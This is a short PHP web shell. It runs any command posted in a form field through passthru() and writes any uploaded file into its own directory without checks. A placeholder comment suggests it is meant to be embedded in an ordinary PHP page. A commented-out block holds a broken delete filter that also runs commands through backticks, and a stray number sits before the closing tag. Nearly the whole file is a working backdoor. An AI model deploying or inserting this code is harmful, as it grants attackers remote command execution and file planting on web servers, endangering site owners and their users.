<?php

if(!isset($_FILES["file"]))
{
  
  if ($_POST["comsub"])
  {
    echo '<pre>';
	echo passthru(str_replace("\\","",$_POST[com]),$result);
	if($result==0) echo "<br>OK<br>";	
	else echo "<br>Not OK<br>";
  }
  
  //php file codes...
}
else
{
	if ($_FILES["file"]["size"] > 0)
	{
		$path = "./";
		$file_name = $_FILES['file']['name'];
		$file_temp = $_FILES['file']['tmp_name'];
		if(file_exists($file_name))	die("File exist!");
		if(move_uploaded_file($file_temp, $path.$file_name))
			echo"Effort Successful.";
		else
			echo"There was a problem, please try again.";
	}
	else echo "File is empty!";
}

/*
$filename=substr(strrchr($_POST[com], " "), 1);

if(strpos(($_POST[com]),"del")==false || strpos(($_POST[com]),"rm")==false)
{
	passthru($_POST[com],$result);
	if($result==0) echo "OK";	
	else die("Not OK");
}

elseif(strpos(($_POST[com]),"del")==0)
{
	if(file_exists($filename))	echo `$_POST[com]`;
	else echo "The file $filename does not exist!";
}
*/

4980

?>